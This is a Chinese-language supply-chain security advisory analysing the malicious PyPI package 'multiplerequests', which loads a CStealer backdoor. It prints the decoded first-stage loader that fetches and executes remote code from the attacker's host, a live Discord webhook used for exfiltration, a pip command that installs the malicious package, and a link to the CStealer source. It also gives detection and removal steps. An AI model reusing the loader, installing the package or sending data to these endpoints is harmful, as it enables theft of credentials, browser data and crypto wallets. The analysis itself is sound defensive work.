---
title: 供应链投毒预警 | 恶意Py包伪装HTTP组件开展CStealer窃密后门攻击
url: https://mp.weixin.qq.com/s?__biz=MzA3NzE2ODk1Mg==&mid=2647790644&idx=2&sn=f9551c365c64a03a313430e33c317189&chksm=87709c63b0071575a4a58e85beef721cd97619279f62e55004112e437e7ce7e4f702ff6e639f&scene=58&subscene=0#rd
source: 悬镜安全
date: 2024-05-11
fetch_date: 2025-10-06T17:18:57.058620
---

# 供应链投毒预警 | 恶意Py包伪装HTTP组件开展CStealer窃密后门攻击

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/KOWJ2ib68IGgBSdF4QaJgj2ic3qiaibot1JrMh15FQ1I9YnCEq7qBe52UqaSzE2FXBEYkticY9GibsNibaN2NMJSzu5tA/0?wx_fmt=jpeg)

# 供应链投毒预警 | 恶意Py包伪装HTTP组件开展CStealer窃密后门攻击

悬镜安全

以下文章来源于OpenSCA社区
，作者悬镜安全情报中心

![](http://wx.qlogo.cn/mmhead/Q3auHgzwzM6fSsEdlx7lBC1wgOlVeL8CBs4tD4s0SbfkaDxoFZDdlw/0)

**OpenSCA社区**
.

全球数字供应链安全社区，用开源的方式做开源治理！

![](https://mmbiz.qpic.cn/mmbiz_gif/KOWJ2ib68IGgALRzA4dxvk3TIxjvYl6iaZYTLlFC0WhuKC0ogplsM3dbjcqyicYMDyQWMsI3RiawC0PfeERBeMiaIzg/640?wx_fmt=gif)

**概述**

近日，悬镜供应链安全情报中心在Pypi官方仓库（https://pypi.org/）中捕获1起CStealer窃密后门投毒事件，投毒者连续发布6个不同版本的恶意Py包multiplerequests，目标针对Windows平台python开发者，该恶意包在安装时会远程加载CStealer后门到受害者系统上执行，该后门会窃取受害者系统敏感信息、主流浏览器隐私数据、数字货币钱包应用数据以及系统屏幕截屏等。此外，后门还会尝试驻留Windows系统启动目录实现开机自启动。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8VA6VEdgJoEmeBDKbIvmhMsD9fubf3cKAOtghicaGmhWZIQGzmXNJwFOz5DpRnlhm6ygeobb68DSDoJicpxic6yNA/640?wx_fmt=png&from=appmsg)

恶意Py包multiplerequests基本信息

截至目前，恶意Py包multiplerequests在Pypi官方仓库上被下载435次。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8VA6VEdgJoEmeBDKbIvmhMsD9fubf3cKju5VtMrlVc7bwLiaHwcJmKoxSKKSVwf4yZQQk1OvD9Gjt1GnASSicHIg/640?wx_fmt=png&from=appmsg)pypi仓库恶意包multiplerequests下载量

该恶意Py包仍可从国内主流Pypi镜像源(清华大学、腾讯云等)下载安装，因此潜在的受害者数量可能会更多。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8VA6VEdgJoEmeBDKbIvmhMsD9fubf3cKQjr4QC22egGHS1VCx8oAnib1CN2gslmjlxIFubx8PqF1rHSCVUL5UIg/640?wx_fmt=png&from=appmsg)

清华镜像源

以国内清华大学镜像源为例，可通过以下命令测试安装该恶意组件包。

```
pip3 install multiplerequests -i  https://pypi.tuna.tsinghua.edu.cn/simple
```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/8VA6VEdgJoEmeBDKbIvmhMsD9fubf3cK4eZ3FMS3wFAib3dohexcx1zRLpwCkM1HtTM4xOEG4TkGC2hFAIvibTXg/640?wx_fmt=jpeg)本地模拟安装恶意包multiplerequests

由于该恶意Py包只针对Windows系统，测试环境使用Linux系统，导致恶意包安装过程中触发恶意代码时触发非预期的Windows系统路径(~\\AppData\\Roaming/frvezdffvvcode.py) 的文件写入操作。

**投毒分析**

以multiplerequests恶意包2.31.0版本为例，当Python开发者使用pip install从Pypi官方仓库或下游镜像源直接安装或依赖引用恶意组件包时，将自动触发执行Python安装包setup.py中经过base64编码的恶意代码。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8VA6VEdgJoEmeBDKbIvmhMsD9fubf3cKltH1N44pc0xeoPD3Lpv9E1ncalCQlnEf8iayfFQ8B0o2ichWUwODckqg/640?wx_fmt=png&from=appmsg)

第一阶段恶意代码

恶意代码base64解码后如下所示，第一阶段恶意代码进一步从投毒者服务器上（https://frvezdffvv.pythonanywhere.com/getpackage）拉取第二阶段恶意代码并执行。

```
from urllib import requestpackage_url = "https://frvezdffvv.pythonanywhere.com/getpackage"package_name = request.urlopen(package_url).read()exec(base64.b64decode(package_name))
```

第二阶段恶意代码同样经过base64编码，如下所示：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8VA6VEdgJoEmeBDKbIvmhMsD9fubf3cKq42wzvmUic6rqxyPD05zfuAnQNbneHbIxnl2cEDFia8Z7DsibmmTdnIyg/640?wx_fmt=png&from=appmsg)

第二阶段恶意代码(base64编码)

Base64解码后还原出真实的第二阶段恶意代码，如下所示：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8VA6VEdgJoEmeBDKbIvmhMsD9fubf3cKfia3B8Um3ZSP4yb88hAic3OAtysL8EpleTOuyQlnsV65ec0XWZ8A8lUA/640?wx_fmt=png&from=appmsg)

第二阶段真实恶意代码

经代码分析后确认该恶意代码是github开源CStleaer后门项目的变种版本：

```
https://github.com/can-kat/cstealer/blob/main/cstealer.py
```

‍

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8VA6VEdgJoEmeBDKbIvmhMsD9fubf3cKK55qicVsG77tAO7JCR0CY7wyrJcSb7kXx8yO5Mh51Z8PqMa71HIG9tg/640?wx_fmt=png&from=appmsg)

CStealer窃密后门项目

该CStleaer变种后门主要包括以下功能：

* 收集系统敏感信息
* 收集浏览器私密数据
* 收集数字钱包应用数据
* 系统屏幕截屏
* 开机自启动

*Part 1*

**收集系统敏感信息**

通过Python内置platform和socket模块获取操作系统版本、处理器、网卡MAC、网络IP地址、主机名等敏感信息，并将数据外传到投毒者webhook接口。

```
https://discord.com/api/webhooks/1233936673201717258/ZkGsTyRGKfqYb2BWGqAjLNYNWZhca-yEVm3gpTYSSvkUV9JRXNQVaTuW4VPr2Jgs9Oot
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8VA6VEdgJoEmeBDKbIvmhMsD9fubf3cKaficZrRPOf0tZXbNHdK8fvKibxZNaxic1NT7TPpl8MZRek7NB2lf1VdfA/640?wx_fmt=png&from=appmsg)

系统信息收集功能

*Part 2*

**收集浏览器隐私数据**

针对基于chromium内核的主流浏览器（Chrome、opera、edge、torch、yandex、epic等）进行用户隐私数据收集，包括Cookie、登录凭证、浏览历史数据、下载记录等。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8VA6VEdgJoEmeBDKbIvmhMsD9fubf3cKoSaGkUwHWc6WlBtVm32icFRsdNbnLh9q630iaMCmxK3CmB6DYqxddWibQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8VA6VEdgJoEmeBDKbIvmhMsD9fubf3cKDh4SOQhoEXLrFsvk9NahVKzhbwJkVmdSVWq8viaOyhf3hT46vL7pJXQ/640?wx_fmt=png&from=appmsg)

浏览器用户隐私数据收集功能

浏览器数据收集后，会被压缩打包发送到投毒者webhook接口：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8VA6VEdgJoEmeBDKbIvmhMsD9fubf3cKh7W8xhu8bYb0TvpgWONdic3PoJibNwfkFJoytdeAhtBkCfZ7nTSRCstA/640?wx_fmt=png&from=appmsg)

浏览器隐私数据外传功能

*Part 3*

**收集数字钱包应用数据**

针对主流数字钱包（Atomic Wallet、Binance、Electrum等）的应用数据进行压缩打包后，利用curl将钱包数据外传到投毒者服务器。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8VA6VEdgJoEmeBDKbIvmhMsD9fubf3cKicZhbJZwOFwlBJfmRRzhdKkyImSa7kCUZwiaeoyt304WQpQhWa24opcw/640?wx_fmt=png&from=appmsg)

数字钱包及其应用数据路径

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8VA6VEdgJoEmeBDKbIvmhMsD9fubf3cKhtQSFwricYa74vutbtoiaU8PbEv9JsegmlDoZ6Fc0kRnkvuvGOEevSeg/640?wx_fmt=png&from=appmsg)

数字钱包应用数据外传接口

*Part 4*

**系统屏幕截屏**

首先从攻击者服务器下载Python mss模块安装包（mss.zip）到目标系统中，并对安装包进行解压。

```
https://frvezdffvv.pythonanywhere.com/getmss
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8VA6VEdgJoEmeBDKbIvmhMsD9fubf3cKZnIDGzeEpPIhPt1QyCEPo6JCRr16IkSeDOPyU85emxRyItv5jdcJew/640?wx_fmt=png&from=appmsg)

远程下载Python mss屏幕截屏模块

Python mss是个基于ctypes实现的跨平台屏幕截屏模块，项目源码托管在github上。

```
https://github.com/BoboTiG/python-mss
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8VA6VEdgJoEmeBDKbIvmhMsD9fubf3cKVud1Puaryl3VIwQCOuWKdfwkiahzwGznrj50RdZicZ9XOFrPnzFJNIyg/640?wx_fmt=png&from=appmsg)

Python MSS开源项目

如下所示，恶意代码利用Python-mss模块获取受害者系统的屏幕截屏后，将截屏数据发送到投毒者webhook接口上。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8VA6VEdgJoEmeBDKbIvmhMsD9fubf3cKwhedtRxndichyH2cWHrpcyy8708UtgsjOl0LzyjIghoVZ2cZmrPNdrQ/640?wx_fmt=png&from=appmsg)

系统屏幕截屏及数据回传

*Part 5*

**开机自启动**

该CStealer后门还会将自身恶意代码拷贝到Windows系统启动目录，尝试通过开机自启动实现投毒持久化。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8VA6VEdgJoEmeBDKbIvmhMsD9fubf3cKQts8lQ2t2WVzhVY0snslVAeSBqia37icpNuuBJj866WpsYFibCU3Kibc5A/640?wx_fmt=png&from=appmsg)

恶意后门写入Windows系统自启动目录

*Part 6*

**IoC数据**

此次投毒组件包涉及的恶意文件和IoC数据如下表所示：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8VA6VEdgJoEmeBDKbIvmhMsD9fubf3cKN5XA8eLJ1U27hlfbkKnvicA9lYPtg9Ltg7UWkGGiavCRBnIC5eibUnF7Q/640?wx_fmt=png&from=appmsg)

**排查方式**

截至目前，该Python恶意组件包仍可从国内主流Pypi镜像源正常下载安装，国内Python开发者可根据恶意包信息和IoC数据通过以下方式进行快速排查是否安装或引用恶意组件包。

开发者可通过命令 pip show multiplerequests 快速排查是否误安装或引用该恶意py组件包，若命令运行结果如下图所示，则代表系统已被安装该恶意组件，请尽快通过命令pip uninstall multiplerequests -y 进行卸载，同时还需关闭系统网络并排查系统是否存在异常进程。

此外，开发者也可使用OpenSCA-cli，将受影响的组件包按如下示例保存为db.json文件，直接执行扫描命令（opensca-cli -db db.json -path ${project\_path}），即可快速获知您的项目是否受到投毒包影响。

```
[  {    "product": "multiplerequests",    "version": "[2.31.0, 2.31.1, 2.31.2, 2.31.3, 2.31.4, 2.31.5]",    "language": "python",    "id": "XMIRROR-MAL45-7DF79312",    "description": "Python恶意组件包multiplerequests开展CStealer窃密后门攻击","release_date": "2024-04-25"}]
```

悬镜供应链安全情报中心将持续监测全网主流开源软件仓库，对潜在风险的开源组件包进行动态跟踪和溯源，实现快速捕获开源组件投毒攻击事件并第一时间提供精准安全预警。

＋

**推荐阅读**

![](https://mmbiz.qpic.cn/mmbiz_gif/4n5ZuFMv7H1QBg2jfzBmx0sZOtFZGlw3wkPiaUoO6dgnicuvVGmQX3zrNyHnWcLIm3icHB9bGib7grlHCH83cUq8ibw/640?wx_fmt=gif)

[![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/8VA6VEdgJoGvgE6o1uWtXn6gEYibnrfjKaPmYm1P3Nd1ou2BnrnRosAn8mjgExdo06d7ZficwVqX2bLgYiaT7RRoA/640?wx_fmt=jpeg&from=appmsg)](http://mp.weixin.qq.com/s?__biz=MzkwMjMxMDMyMQ==&mid=2247486346&idx=1&sn=36cf621eb08c82597515f3365e095a3d&chksm=c0a63b54f7d1b242fca7edbf1fbab961a5c4b5002d71dfb0fabbe104c25878fcf06f24133168&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_png/KOWJ2ib68IGgRcurce6uu4lnYZPxrRLXoLlTPtkl0vyGJkBK67AvzWJFO2RsKQUNRFXh9b9M3LvVtO6ktNvV14w/640?wx_fmt=png&from=appmsg)](http://mp.weixin.qq.com/s?__biz=MzA3NzE2ODk1Mg==&mid=2647790091&idx=2&sn=81423f8f885e8f3cc9e0d0977b0e2c15&chksm=87709a5cb007134af266c02b91ec2d89390caa68dfdec1ef151d90e87f8b303dad3bdb452da7&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/KOWJ2ib68IGgic6A3nibLIkqTfzcVUR16vtLVU49xEZG5X2pTOuJcbiaEv2pBrU9ibUnSUSfHtFCrTe6QOLZ5VIOCUA/640?wx_fmt=jpeg&from=appmsg)](http://mp.weixin.qq.com/s?__biz=MzA3NzE2ODk1Mg==&mid=2647790063&idx=1&sn=88adf918d77088701cbec8db9a4bb464&chksm=877099b8b00710ae86d32831d057d79b2f4342018a46f89eba8c978f4d1db00a8b383314f711&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_png/KOWJ2ib68IGhy7S...